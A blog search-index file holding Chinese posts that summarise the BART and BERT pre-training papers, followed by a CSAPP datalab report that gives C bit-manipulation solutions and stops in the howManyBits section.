<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BART</title>
    <url>/blog/2021/08/29/BART/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>BART 是 Facebook AI 于 2019 年发表的《Denoising Sequence-to-Sequence
Pre-training for Natural Language Generation, Translation, and
Comprehension》论文中提出的预训练模型，论文收录于 2020 年 ACL。顾名思义，BART 是一个基于 seq2seq 的预训练模型，可以用于自然语言生成、翻译、理解等任务。论文中的 “Denoising” 直译为降噪，实际上是模型的预训练目标。</p>
<span id="more"></span>
<p>一个水逆的周末，博客更新不能停！</p>
<h2 id="模型">模型</h2>
<p>预训练模型之前已经介绍过了，参考 <a href="https://tqnwhz.github.io/blog/2021/08/16/BERT/#more">BERT</a>。这里只做简单的介绍。预训练模型的目的是在大量数据上预训练一个能够解决通用任务的模型，下游任务可以在预训练模型的基础上进行调整适配，无需从头训练。预训练模型往往有几个关键因素：</p>
<ul>
<li>模型架构。Transformer 是公认的特征抽取能力很强的架构，因此常见的预训练模型都是用的 Transformer 架构。</li>
<li>预训练目标。在 BERT 之前，预训练模型往往都是按照标准的语言模型进行训练，例如 ELMO。BERT 第一次提出了掩码语言模型这样的预训练任务，不仅能够更好地适配下游任务，而且取得了更优的效果。如何能够挑选一个更好的预训练目标来建模通用任务，也是预训练模型的关键。</li>
<li>适用任务及使用方法。虽然预训练模型是为建模通用任务而存在的，然而还是存在适用任务的限制，具体任务对使用方法也有要求。</li>
<li>数据集。要求很简单，大而全。大就不用说了，数据集最好能够涵盖多个领域的数据，这样适配下游任务也会更简单。</li>
<li>效果。事实上没有个 state-of-the-art 都不太可能发出来，相对没有那么重要。</li>
</ul>
<p>按照这个顺序，我们来介绍一下 BART 模型。</p>
<h3 id="架构">架构</h3>
<p>基于 Transformer 的 seq2seq 模型，与 GPT 和 BERT 一样，使用的激活函数是 gelu 而不是 relu。与 BERT 的区别在于：</p>
<ul>
<li>有解码器、在解码器的每一层，添加了对编码器最后一层输出的注意力，跟 seq2seq 的注意力一致。</li>
<li>BART 去掉了在词预测之前的前馈神经网络。</li>
</ul>
<p>总结一下就是个 Transformer。与 BERT 的主要区别在于有解码器，可以用于生成任务，与 GPT 的主要区别在于有编码器，可以更好地用于监督的生成任务，如下图所示。</p>
<p><img src="architecture.png"></p>
<h3 id="预训练目标">预训练目标</h3>
<p>BART 的预训练目标定义为：给定文档，使用噪声函数（符号遮挡、符号删除、符号填充、文档排列、文档旋转）对文档施加噪声，再进行文档重构。换而言之，输入为有噪声的文档，期望输出为没有噪声的文档，这正是论文名中的 “降噪” 的由来。
在实验过程中，噪声可能是以上噪声函数的组合。几种噪声函数的示例分别如下：</p>
<p><img src="noises.png"></p>
<h3 id="适用任务">适用任务</h3>
<p>BART 可适用于以下任务：</p>
<ul>
<li>句子分类，输入输出均为该序列，将解码器的最终隐藏状态拿去分类即可，类似 BERT 中的 [CLS]
token。</li>
<li>符号分类，输入输出均为该序列，将解码器每个位置的隐藏状态拿去分类即可。</li>
<li>序列生成，例如文本摘要、问答等任务，给定输入输出进行 fine-tune 即可。</li>
<li>目标语言为英语的机器翻译，这个任务其实也属于序列生成，不过有点不太一样。具体做法为，将 BART 的编码器随机初始化（就是丢弃本来的权重），然后冻结其他参数只更新编码器权重，后面再微调所有权重。这里限制为英语主要是 BART 本身在英文语料上训练的。</li>
</ul>
<h2 id="实验">实验</h2>
<h3 id="预训练目标比较">预训练目标比较</h3>
<p>为了评估各种预训练目标的有效性，BART 在尽量控制变量（分别调优，学习率、正则化可能有所差别）的前提下比较了如下几种预训练目标：</p>
<ul>
<li>语言模型，与 GPT 类似，从左向右的语言模型</li>
<li>置换语言模型，基于 XLNET，对 1/6 的符号进行采样，再进行自回归预测</li>
<li>掩码语言模型，与 BERT 类似</li>
<li>多任务掩码语言模型，与 uniLM 类似</li>
<li>掩码 seq2seq：掩码 50% 的序列，由 seq2seq 预测</li>
</ul>
<p>通过在问答、对话、摘要等多项任务上进行比较，论文得出以下结论：</p>
<ul>
<li>预训练目标的性能与下游任务有着很密切的关系，一个简单的语言模型可以在生成式问答上取得最优效果，在抽取式问答上效果确实最差的</li>
<li>符号遮挡是至关重要的，没有符号遮挡的文档旋转、句子重排的预训练目标表现较差</li>
<li>从左到右的语言模型预训练任务能改善生成任务，像掩码语言模型和置换语言模型不包含自回归语言模型训练任务，生成任务效果就会比较差</li>
<li>双向编码器对 SQuAD 数据集是非常重要的</li>
<li>预训练目标并非唯一重要的因素，任务性能也与模型结构等因素有很大关系</li>
<li>纯粹的语言模型在 ELI5 数据集上取得了最好的性能</li>
<li>使用文本填充预训练的 BART 取得了大部分数据集上的最优性能</li>
</ul>
<h3 id="大规模预训练">大规模预训练</h3>
<h4 id="判别任务">判别任务</h4>
<p>在两个数据集上进行实验：</p>
<ul>
<li>SQuAD（Stanford Question Answering
Dataset，斯坦福问答数据集）：给定一篇文章和一个问题，从原文中选取部分文字作为问题的答案（答案一定原文中）。虽然是问答任务，但是并不是生成式的任务，而是判别式的任务。</li>
<li>GLUE（General Language Understanding
Evaluation，通用语言理解评估）：由九个任务组成，每个任务都是句子或句子对的分类任务，例如 CoLA 对单句子是否符合文法进行评估，QQP 评估一对问题是否等价。</li>
</ul>
<p><img src="nlu.png"></p>
<p>两个数据集上的实验结果显示，BART 可以和 RoBERTa 打的有来有回。</p>
<h4 id="生成任务">生成任务</h4>
<p>分别在摘要生成、对话、问答生成、翻译多个任务上进行了实验，数据集分别介绍如下：</p>
<ul>
<li>CNN/DailyMail 和 XSum 是摘要生成的两个英文数据集。每个数据样本由文档与人工总结的摘要组成。与抽取式摘要任务不同，摘要中可以出现文档中未出现的单词或者句子。</li>
<li>CONVAI 是一个对话数据集，回复不仅取决于上下文，还取决于对话人的角色信息，换而言之，模型需要根据上下文和角色信息生成合适的回复。</li>
<li>ELI5 是一个生成式问答数据集，根据文档回答指定的问题。</li>
<li>WMT16 是一个翻译数据集，涵盖了多种语料到英语的翻译数据。</li>
</ul>
<p>在四项生成任务上的评估表明，BART 都取得了 SOTA 的性能。</p>
<h2 id="总结">总结</h2>
<p>BART 是一个基于 Transformer 架构的去噪 seq2seq 模型，通过破坏和重建原始文本进行预训练，在自然语言理解任务上与现有模型难分伯仲，但在自然语言生成任务上达到了 SOTA 的性能。</p>
<p>预训练模型简单分为三类：</p>
<ul>
<li>仅编码器，如 BERT，可以直接用于自然语言理解任务，或者加个解码器再用于生成任务。</li>
<li>仅解码器，如 GPT，可以直接用于自然语言生成任务，或者加个编码器可以用于条件生成任务。</li>
<li>编码器 + 解码器，如 BART，可以同时直接用于两种任务。</li>
</ul>
<p>后面可能会读一下 RoBERTa 的论文。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>BART</category>
      </categories>
      <tags>
        <tag>BART</tag>
        <tag>预训练模型</tag>
      </tags>
  </entry>
  <entry>
    <title>BERT</title>
    <url>/blog/2021/08/16/BERT/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来看读的是大名鼎鼎的 BERT，出自论文 Google 团队 2018 年的论文《BERT:
Pre-training of Deep Bidirectional Transformers for Language
Understanding》。BERT（<strong>B</strong>idirectional
<strong>E</strong>ncoder Representations from
<strong>T</strong>ransformers）可谓是 NLP 历史上划时代的预训练模型，在 11 项自然语言处理任务上都取得了 state-of-the-art。并且，Google 将 BERT 的代码与预训练模型全部开源，便于大家使用。</p>
<span id="more"></span>
<h2 id="预训练语言模型">预训练（语言）模型</h2>
<p>预训练语言模型是自然语言处理中的重要部分，与计算机视觉中的预训练模型类似，也是为了从特定的下游任务中脱离出来，在大量数据上预训练可以解决通用任务的模型。这样以来，下流任务可以根据自己的任务特点进行微调，而不需要从头训练。这样做的好处非常明显：</p>
<ul>
<li>训练时间更短</li>
<li>数据要求更少</li>
</ul>
<p>在计算机视觉中，预训练模型例如 ImageNet 首先得到广泛应用，利用 ImageNet，你可以很快地构造一个特定任务的识别模型，而不需要从头训练，重复捕捉像物体边界等信息。在自然语言处理中，预训练模型应用就没有那么广泛。一个主要的原因就是多义词，例如 “苹果” 既可以代表电脑品牌、也可以代表水果，其具体的含义要根据具体的上下文才能推断出来。而像 word2vec/glove 这样的静态词向量算法，词向量一经训练得到就固定了，所以不能建模一词多义的现象。ELMO 于 2018 年 3 月提出，在双向 LSTM 上预训练语言模型，解决了静态词向量存在的问题，然而还没来得及大展拳脚，就被 2018 年 10 月的 BERT 拍死在了沙滩上。。。</p>
<p>预训练模型可以简单分为两类：</p>
<ul>
<li>基于特征的预训练模型，指利用语言模型的中间结果，作为额外的特征，引入到下游任务中。典型的就是 ELMO。特点：<strong>模型参数是固定的</strong>。</li>
<li>基于微调的预训练模型，指在语言模型的基础上，加入少量的特定任务参数（例如分类任务，加一层 softmax），再在任务数据上微调模型，典型的就是 GPT。特点：<strong>模型参数需要微调</strong>。</li>
</ul>
<p>在 BERT 之前的预训练模型，例如 ELMO 与 GPT，存在的一个重要问题是它们只从单向建模了序列。虽然 ELMO 是使用的双向 LSTM，也只是把双向的隐藏状态进行了拼接，双向的特征信息也没有很好地进行融合。形式化的来说，标准的语言模型就是单向的，当前词的选择只依赖于先前词，例如从左到右方向：
<span class="math display">\[
P_{l2r}(x_1,x_2,\dots,x_n)=\prod_{t=1}^nP(x_t|x_{&lt;t})
\]</span></p>
<h3 id="掩码语言模型masked-language-modelmlm">掩码语言模型（masked
language model，MLM）</h3>
<p>考虑到标准的语言模型所存在的问题，BERT 提出了一种掩码语言模型的任务，具体做法为：随机遮挡输入中的部分单词，目标是仅根据单词的上下文预测当前位置本来的单词（即遮掩前的单词）。与从左到右的语言模型不同，掩码语言模型能够融合单词的左右上下文。形式化而言，对于<span class="math inline"> \(x_t\)</span> 的概率分布，掩码语言模型计算的是<span class="math inline"> \(P(x_t|x_{&lt;t},x_{&gt;t})\)</span>，标准的语言模型计算的是<span class="math inline"> \(P(x_t|x_{&lt;t})\)</span>。但值得注意的是，掩码语言模型并不是传统的语言模型，一些论文中可能存在二者混用的情况。语言模型的定义可以看我之前的博客
<a href="https://tqnwhz.github.io/blog/2021/07/22/language-model/#more">语言模型
| 一隅</a>。</p>
<p>个人认为掩码语言模型的思路与 cbow 的思想是有些像的，根据一个单词的上下文来预测这个词。</p>
<h2 id="bert">BERT</h2>
<p>BERT 主要分为两个阶段：预训练和微调。两者流程如下所示：</p>
<p><img src="architecture.png"></p>
<p>可以看到，除了输出层，预训练和微调的架构基本上是完全一致的。预训练的权重将会作为下流微调任务的参数的初始权重。在序列中，BERT 加入了两个特殊标记：</p>
<ul>
<li>[CLS]：添加于序列起始位置，作为整个序列的表示，可以用于分类任务。</li>
<li>[SEP]：当输入为一对序列的时候（例如问答任务，一问一答），添加于两序列之中，作为分隔符。</li>
</ul>
<p>BERT 由若干个 <strong>Transformer 编码器</strong>（注意只有编码器）组成，在论文中，作者提出了两种规模的 BERT：</p>
<ul>
<li><span class="math inline">\(BERT_{BASE}\)</span>​：由 12 个 Transformer 编码器堆叠而成，隐节点大小为 768，自注意力机制有 12 个头，约 110M 参数。</li>
<li><span class="math inline">\(BERT_{LARGE}\)</span>​：由 24 个 Transformer 编码器堆叠而成，隐节点大小为 1024，自注意力机制有 16 个头，约 340M 参数。</li>
</ul>
<h3 id="输入输出表征">输入输出表征</h3>
<p>在输入表征上，BERT 使用了 WordPiece 的词嵌入，词表大小为 30000。WordPiece 是一种子词模型，token 粒度介于整个单词与字符之间，例如会将 “working” 这个单词拆分为 “work”、“ing” 两个 token 存储在词表中，"ing" 又可以与其他的动词结合，这样就可以用更小的词表存储更多的单词，也没有损失太多的语义信息。</p>
<p>BERT 的输入既可以是单个序列，也可以是一对序列（例如问答场景）。应用于一对序列时，需要插入 [SEP] 分隔符，并且要使用段嵌入向量。对于输入的每个 token，它的输入表征为以下三个向量的和：</p>
<ul>
<li>符号向量（token embedding），也就是我们传统意义上所说的词向量。</li>
<li>段向量（segement
embedding），用以区分一对序列中的两个不同的序列。</li>
<li>位置向量（position embedding），用以编码位置信息。</li>
</ul>
<p><img src="embedding.png"></p>
<p>值得注意的是，<strong>以上三种词向量全部通过学习得到</strong>，这与 Transformer 不同。Transformer 中的位置向量是通过三角函数计算得到，而 BERT 是通过学习得到的。就这一点作者似乎没有进行解释，而 Transformer 的作者在论文中实验结果是，学习得到与使用三角函数的位置向量效果相近，而三角函数更易扩展。一种说法是 BERT 使用的语料更大，可能可以学习到更好的位置向量。</p>
<h3 id="预训练">预训练</h3>
<h4 id="掩码语言模型">掩码语言模型</h4>
<p>在训练时，按一定比例（实验中为 15%）随机屏蔽输入序列中的部分单词（使用 [MASK] 替换），然后预测被屏蔽掉的单词，而不是重建整个输入序列。这个过程与完形填空类似，想象一个句子中有几个单词空缺，掩码语言模型的目标就是根据上下文成功预测空缺的单词。这与语言模型的训练方式还是有较大差别的。</p>
<p>上述方式虽然听上去很合理，但有一个问题，在下流任务的微调阶段，并不会出现 [MASK] 标记，这一定程度上导致了预训练与微调间的不匹配。为了解决这种情况，BERT 并不总是使用 [MASK] 替换掉需要屏蔽的单词，而是按照概率执行对应操作：</p>
<ul>
<li>80% 替换为 [MASK]</li>
<li>10% 替换为随机其他单词</li>
<li> 10% 保持不变</li>
</ul>
<p>之后，被屏蔽掉的单词会被用以预测原本的单词，换而言之，预测概率变为<span class="math inline"> \(P(x_t|x_{&lt;t},x_{mask},x_{&gt;t})\)</span>。这样能够缓解预训练与微调间的不匹配情况。直观来看，BERT 会参考被屏蔽掉单词，因为它有 10% 的概率就是真实的单词，但也不会完全依赖这个单词，因为 10% 的概率还是很小的。</p>
<h4 id="下句预测next-sentence-predictionnsp">下句预测（Next Sentence
Prediction，NSP）</h4>
<p>考虑到 NLP 中的很多任务例如问答、自然语言推理都基于句子间关系的理解，而这种句子间的关系不能被语言模型捕获，因此 BERT 提出了一个名为下句预测的预训练任务。顾名思义，这个任务的目标是判断两个句子是否构成上下句的关系。这个任务的数据非常容易获得，在大规模语料上获取连续的两句话，并以 50% 的概率替换真实的下句话，即可得到正负样本分布均匀的数据集。</p>
<h3 id="微调">微调</h3>
<p>在微调时，只需要将特定任务的输入输出放到 BERT 中，微调所有参数，输入的形式可以是单个句子或句子对，可以应用的任务举例如下：</p>
<ul>
<li>单个句子：文本分类、序列标注、情绪分析（利用 [CLS] 符号）</li>
<li>句子对：释义、问答等任务</li>
</ul>
<p>对于句子对，传统的模型往往将其拆分分开处理，而 BERT 将句子对同时投喂到模型中，能够更好地捕获句子间关系。</p>
<h2 id="实验">实验</h2>
<p>实验部分主要介绍了 BERT 微调之后是怎么横扫涵盖通用语言评理解评估等十一项任务的，基线模型有 biLSTM+elmo，GPT 等，这里就不多介绍了。有兴趣的可以去看看原文。</p>
<h2 id="消融实验">消融实验</h2>
<p>消融实验更像是控制变量法，对于模型中的多个改进，控制变量来分析哪个改进对于效果的提升是最大的，这就是消融实验。消融实验细节可以看原文，我在这里总结一下消融实验的结论：</p>
<h3 id="预训练任务">预训练任务</h3>
<ul>
<li>去除下句预测后的 BERT 模型在 QNLI,
MNLI 等涉及句子对的任务上的性能损失严重，证明下句预测对于句子间关系的捕获还是很有作用的。</li>
<li>仅使用从左到右的语言模型训练的 BERT 比使用掩码语言模型训练得到的 BERT 效果要差，证明掩码语言模型训练方式的有效性。</li>
</ul>
<h3 id="模型大小">模型大小</h3>
<ul>
<li>参数越多，各项任务上的效果越好，非常的真实。</li>
</ul>
<h3 id="训练步数">训练步数</h3>
<ul>
<li>BERT 真的需要在 128,000 字符 /batch
上训练 1,000,000 步才能达到这么好的效果，训练一百万步比五十万步的 BERT 在 MNLI 获得了 1% 的提升。</li>
<li>掩码语言模型的收敛慢于自左向右的语言模型，但就精度而言，掩码语言模型几乎在训练之初就强于语言模型。</li>
</ul>
<h3 id="基于特征的方法">基于特征的方法</h3>
<ul>
<li>BERT 对基于特征和微调的方法都是有效的。</li>
</ul>
<h2 id="结论">结论</h2>
<p>论文提出了一种全新的预训练任务 -- 掩码语言模型，并在该任务和下句预测任务上预训练了一个基于双向 Transformer 的深层模型 BERT。在十一项 NLP 任务上的微调实验结果表明，BERT 的效果优于现有的预训练模型。</p>
<p>BERT 的论文断断续续读了几天，读下来感觉醍醐灌顶，很多之前模棱两可的东西都真正了解了。果然读论文还是要读原文，别人的博客只是参考。后面有空了再读一读 BERT 的源码，又想去读 GPT 的论文，时间也太少了。</p>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/46833276">论文解读：BERT 模型及 fine-tuning
- 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>BERT</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>BERT</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-1 实验报告: datalab</title>
    <url>/blog/2023/04/28/CSAPP-Lab-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 CSAPP
datalab 的实验报告，该 lab 的目的是验证对整数 / 浮点数表示及相关操作的理解能力。该 lab 要求仅使用有限的位运算，实现各种操作。</p>
<span id="more"></span>
<p>实验内容共 13 个函数，可以分为整数和浮点数两部分：</p>
<ul>
<li>整数部分：仅允许使用移位、&amp;, |, ^
等运算，不允许使用类型转换、循环分支等</li>
<li>浮点数部分：在整数的基础上，允许使用循环分支</li>
</ul>
<p>具体的操作限制因题而异。除了正确性之外，实验还对每个函数允许进行的操作数进行了限制，满足限制才可以得到额外 2 分性能分。</p>
<h2 id="整数">整数</h2>
<h3 id="bitxor">bitXor</h3>
<p>只使用～与 &amp; 实现异或操作。考虑简单的两个 bit a，b：</p>
<p>a^b=1 &lt;=&gt; a=1, b=0 or a=0, b=1 &lt;=&gt; a&amp;b=0 and
a|b=1</p>
<p>然而 | 是不能使用的，因此可以反过来思考：</p>
<p>a|b=1 &lt;=&gt; a,b 至少有 1 个 1 &lt;=&gt; ~a&amp;~b=0</p>
<p>因此可以得到如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>{</span><br><span class="line">  <span class="keyword">return</span> ~(x &amp; y) &amp; ~(~x &amp; ~y);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="tmin">tmin</h3>
<p>返回补码下最小的数字，只有权重为负的最高位值为 1，其余位均为 0</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>{</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="istmax">isTmax</h3>
<p>判断一个数是否是补码下的最大整数。</p>
<p>Tmax 只有最高位为 0，观察可以发现<span class="math inline"> \(\sim
Tmax=Tmax+1=Tmin\ne 0\)</span>，因此可以得到下面的式子。<span class="math inline">\(\ne 0\)</span> 是考虑到输入为 - 1 的情况。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two's complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> plusOne = x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> notX = ~x;</span><br><span class="line">  <span class="keyword">return</span> !(notX + (~plusOne + <span class="number">1</span>)) &amp; !!plusOne;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="alloddbits">allOddBits</h3>
<p>判断 x 的奇数位是否均为 1。直接构造出奇数全为 1 的数<span class="math inline"> \(a\)</span>，判断 x&amp;a==a 即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> base = <span class="number">0xAA</span>;</span><br><span class="line">  <span class="keyword">int</span> half = (base &lt;&lt; <span class="number">8</span>) + base;</span><br><span class="line">  <span class="keyword">int</span> whole = (half &lt;&lt; <span class="number">16</span>) + half;</span><br><span class="line">  x = x &amp; whole;</span><br><span class="line">  <span class="keyword">return</span> !(x + (~whole + <span class="number">1</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="negate">negate</h3>
<p>取相反数。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="isasciidigit">isAsciiDigit</h3>
<p>判断 x 是否满足给定范围，根据加减后的符号位，构造两个布尔量，相与即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> con1 = !((x + (~<span class="number">0x30</span> + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">int</span> con2 = (x + (~<span class="number">0x3a</span> + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> con1 &amp; con2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="conditional">conditional</h3>
<p>实现三目运算符。首先用！将输入转换为零一值 cond，用 cond 为 x，y 构造全 0 或全 1 的 mask。以下代码为例，x=0 时，cond=1，mask=0，结果为 z；x!=0 时，cond=0，mask=0xffffffff，结果为 y。满足三目运算符的性质。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> cond = !x;</span><br><span class="line">  <span class="keyword">int</span> mask = ~<span class="number">0</span> + cond;</span><br><span class="line">  <span class="keyword">return</span> (mask &amp; y) | (~mask &amp; z);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="islessorequal">isLessOrEqual</h3>
<p>判断 x&lt;=y 是否成立。需要考虑加法溢出的问题。解决方法是同号的情况下才相减判断大小，异号时根据符号直接判断大小。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> signx = x &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> signy = y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> isSignDiff = signx ^ signy;</span><br><span class="line">  <span class="keyword">return</span> (isSignDiff &amp; !signy) | (!isSignDiff &amp; !((y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="logicalneg">logicalNeg</h3>
<p>实现非操作，可以将任意值转为 01 值。核心思想是唯一地把 0 映射到 1，其余均映射到 0。先去除 x 的符号位，使得<span class="math inline"> \(x\ge 0\)</span>，如果<span class="math inline"> \(x-1==-1\)</span>，那么<span class="math inline"> \(x=0\)</span>。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> sign = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> notOverflow;</span><br><span class="line">  <span class="comment">// remove sign bit</span></span><br><span class="line">  x = x &amp; ~(sign &lt;&lt; <span class="number">31</span>);</span><br><span class="line">  notOverflow = ((~<span class="number">0</span> + x) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ~sign &amp; notOverflow;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="howmanybits">howManyBits</h3>
<p>重磅！返回补码下表征 x 所需的最少位数。这是个非常复杂的问题，从最大允许 90 次操作就可以看出来。事实上，稍加思考后，就可以知道这个题的关键是找到<strong>与符号位不同的最高位</strong>，答案 + 1（编码符号位）即是答案，例如：</p>
<ul>
<li>0 的符号位为 0，1 的最高位为 0（不存在），答案为 1</li>
<li>-1 的符号位为 1，0 的最高位为 0（不存在），答案为 1</li>
<li>0x80000000 的符号位为 1，0 的最高位是 31，答案为 32</li>
</ul>
